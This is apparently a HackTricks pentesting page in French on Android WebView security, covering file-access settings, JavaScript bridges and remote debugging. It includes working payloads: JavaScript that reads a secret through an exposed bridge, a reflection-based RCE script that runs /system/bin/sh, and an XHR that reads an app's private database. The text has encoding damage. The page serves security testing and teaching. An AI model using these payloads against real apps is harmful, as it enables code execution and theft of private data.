## Configurations Int√©ressantes

## Acc√®s aux fichiers

L'acc√®s aux fichiers de _WebView_ est activ√© par d√©faut. Depuis l'API 3 (Cupcake 1.5), la m√©thode [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est disponible pour l'activer ou le d√©sactiver explicitement.\
Si l'application a _**android.permission.READ\_EXTERNAL\_STORAGE**_, elle pourra lire et charger des fichiers **√† partir du stockage externe**.\
Le _WebView_ doit utiliser un sch√©ma d'URL de fichier, par exemple `file://path/file`, pour acc√©der au fichier.

### Acc√®s universel √† partir d'URL de fichier (obsol√®te)

> D√©finit si les requ√™tes **cross-origin** dans le **contexte d'une URL de sch√©ma de fichier** doivent √™tre autoris√©es √† acc√©der √† **du contenu de n'importe quelle origine**. Cela inclut **l'acc√®s au contenu d'autres URL de sch√©ma de fichier ou de contextes web.** Notez que certains acc√®s tels que les √©l√©ments HTML d'image ne suivent pas les r√®gles de m√™me origine et ne sont pas affect√©s par ce param√®tre.
>
> **Ne** pas activer ce param√®tre si vous ouvrez des fichiers qui peuvent √™tre cr√©√©s ou modifi√©s par des sources externes. L'activation de ce param√®tre permet aux scripts malveillants charg√©s dans un contexte `file://` de lancer des attaques de script intersites, en **acc√©dant √† des fichiers locaux arbitraires**, y compris les cookies WebView, les donn√©es priv√©es de l'application ou m√™me les informations d'identification utilis√©es sur des sites web arbitraires.

En r√©sum√©, cela **emp√™chera le chargement d'origines arbitraires**. L'application enverra la demande d'URL pour charger le contenu avec **`Origin: file://`** si la r√©ponse n'autorise pas cette origine (**`Access-Control-Allow-Origin: file://`**), alors le contenu ne sera pas charg√©.\
La **valeur par d√©faut est `false`** lors du ciblage de [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et sup√©rieur.

* Utilisez [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) pour savoir si JavaScript s'ex√©cutant dans le contexte d'une URL de sch√©ma de fichier peut acc√©der √† du contenu de n'importe quelle origine (si UniversalAccessFromFileURL est activ√©).
* Utilisez [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) pour l'activer ou le d√©sactiver.

{% hint style="info" %}
En utilisant **`loadDataWithBaseURL()`** avec `null` comme baseURL emp√™chera √©galement de charger des fichiers locaux m√™me si tous les param√®tres dangereux sont activ√©s.
{% endhint %}

### Acc√®s aux fichiers √† partir d'URL de fichier (obsol√®te) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> D√©finit si les requ√™tes cross-origin dans le contexte d'une URL de sch√©ma de fichier doivent √™tre autoris√©es √† acc√©der √† du contenu √† partir d'autres URL de sch√©ma de fichier. Notez que certains acc√®s tels que les √©l√©ments HTML d'image ne suivent pas les r√®gles de m√™me origine et ne sont pas affect√©s par ce param√®tre.
>
> **Ne** pas activer ce param√®tre si vous ouvrez des fichiers qui peuvent √™tre cr√©√©s ou modifi√©s par des sources externes. L'activation de ce param√®tre permet aux scripts malveillants charg√©s dans un contexte `file://` d'acc√©der √† des fichiers locaux arbitraires, y compris les cookies WebView et les donn√©es priv√©es de l'application.

En r√©sum√©, cela emp√™che JavaScript d'acc√©der aux fichiers locaux via le protocole `file://`.\
Notez que **la valeur de ce param√®tre est ignor√©e** si la valeur de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) est `true`. \
La **valeur par d√©faut est `false`** lors du ciblage de [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et sup√©rieur.

* Utilisez [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) pour savoir si JavaScript s'ex√©cute dans le contexte d'une URL de sch√©ma de fichier peut acc√©der √† du contenu √† partir d'autres URL de sch√©ma de fichier.
* Utilisez [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) pour l'activer ou le d√©sactiver.

### Acc√®s aux fichiers

> Active ou d√©sactive **l'acc√®s aux fichiers dans WebView**. Notez que cela active ou d√©sactive uniquement l'acc√®s au syst√®me de fichiers. Les ressources et les actifs sont toujours accessibles en utilisant file:///android\_asset et file:///android\_res.

En r√©sum√©, si d√©sactiv√©, le WebView ne pourra pas charger un fichier local avec le protocole `file://`.\
La **valeur par d√©faut est `false`** lors du ciblage de [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) et sup√©rieur.

* Utilisez [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) pour savoir si la configuration est activ√©e.
* Utilisez [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) pour l'activer ou le d√©sactiver.

### WebViewAssetLoader

> Classe d'aide pour charger des fichiers locaux, y compris les ressources et les actifs statiques de l'application, en utilisant des URL http(s):// √† l'int√©rieur d'une classe [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Le chargement de fichiers locaux √† l'aide d'URL de type web au lieu de `"file://"` est souhaitable car il est compatible avec la politique de m√™me origine.

C'est la nouvelle fa√ßon recommand√©e de charger des fichiers locaux. Le but est d'**acc√©der aux fichiers locaux en utilisant une URL HTTP avec le domaine**. De cette fa√ßon, la **CORS** peut √™tre **facilement** maintenue entre les **pages web** locales et les **pages web** t√©l√©charg√©es √† partir du serveur web.

## Javascript activ√©

Les WebViews ont Javascript **d√©sactiv√© par d√©faut**. La m√©thode [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) peut l'activer ou le d√©sactiver explicitement. \
Notez que les webviews peuvent √©galement prendre en charge le **sch√©ma d'intention** qui permet de lancer d'autres applications. Lisez cette [analyse pour savoir comment passer de XSS √† RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

## Pont Javascript

Android offre un moyen pour le JavaScript ex√©cut√© dans un WebView d'appeler et d'utiliser les **fonctions natives d'une application Android** (annot√©es avec `@JavascriptInterface`) en utilisant la m√©thode [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). C'est ce qu'on appelle un _WebView JavaScript bridge_ ou _
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
    // Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
    // not annotated with @JavascriptInterface are not visible from JavaScript
    @JavascriptInterface
    public String getSecret() {
        return "SuperSecretPassword";
    };
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Avec l'acc√®s au code JavaScript, par exemple via une attaque **XSS** stock√©e, une attaque **MITM** ou un **site web malveillant** charg√© dans le WebView, il est possible d'appeler directement les m√©thodes Java expos√©es.

{% hint style="info" %}
Notez que dans le cas o√π l'on essaie d'exploiter cette vuln√©rabilit√© via une **redirection ouverte vers une page web d'attaquant qui acc√®de √† l'objet Android natif**. Si l'acc√®s √† la redirection se fait via un **navigateur mobile** et **non en utilisant** le m√™me **WebView**, le **navigateur ne pourra pas acc√©der √† l'objet Android natif**.
{% endhint %}

Si `addJavascriptInterface` est n√©cessaire, prenez en compte les consid√©rations suivantes :

* **Seul le JavaScript fourni avec l'APK** doit √™tre autoris√© √† utiliser les ponts, par exemple en v√©rifiant l'URL sur chaque m√©thode Java pont√©e (via `WebView.getUrl`).
* **Aucun JavaScript ne doit √™tre charg√© √† partir de points d'extr√©mit√© distants**, par exemple en maintenant la navigation de la page dans les domaines de l'application et en ouvrant tous les autres domaines sur le navigateur par d√©faut (par exemple, Chrome, Firefox).
* Si n√©cessaire pour des raisons de compatibilit√© descendante (par exemple, pour prendre en charge les anciens appareils), **d√©finissez au moins le niveau d'API minimal sur 17** dans le fichier manifeste de l'application (`<uses-sdk android:minSdkVersion="17" />`).

## Pont JavaScript vers RCE via Reflection

Comme indiqu√© dans [**cette recherche**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_consultez-la pour des id√©es si vous obtenez une RCE_), une fois que vous avez trouv√© un pont JavaScript, il est possible d'obtenir une **RCE** via **Reflection** en utilisant une charge utile comme celle-ci :
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
  return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Cependant, les applications modernes peuvent utiliser l'annotation **`@JavascriptInterface`** qui indique au JavascriptBridge que **seule** la m√©thode avec cette annotation doit √™tre **expos√©e**.\
Dans ce sc√©nario, vous ne pourrez pas abuser de la r√©flexion pour ex√©cuter du code arbitraire.

## D√©bogage √† distance

Le **d√©bogage √† distance de WebView** permet d'acc√©der √† la WebView avec les **outils de d√©veloppement Chrome**.\
Le **dispositif** doit √™tre **accessible** par le PC (via USB, √©mulateur local, r√©seau local...) et ex√©cuter la WebView d√©bogable, puis acc√©der √† **chrome://inspect/#devices** :

![](<../../.gitbook/assets/image (525).png>)

S√©lectionnez **inspecter** et une nouvelle fen√™tre s'ouvrira. Dans cette fen√™tre, vous pouvez **interagir avec le contenu** de la **WebView** et m√™me lui faire ex√©cuter du code JS arbitraire √† partir de l'onglet **console** :

![](<../../.gitbook/assets/image (526).png>)

Pour activer le **d√©bogage √† distance de WebView**, vous pouvez faire quelque chose comme :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```
**Ce param√®tre s'applique √† tous les WebViews de l'application.**

{% hint style="info" %}
**Le d√©bogage de WebView n'est pas affect√© par l'√©tat du drapeau `debuggable`** dans le manifeste de l'application. Si vous voulez activer le d√©bogage de WebView uniquement lorsque `debuggable` est `true`, testez le drapeau √† l'ex√©cution.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
    { WebView.setWebContentsDebuggingEnabled(true); }
}
```
# Payloads

## Exfiltrer des fichiers arbitraires
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# R√©f√©rences

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
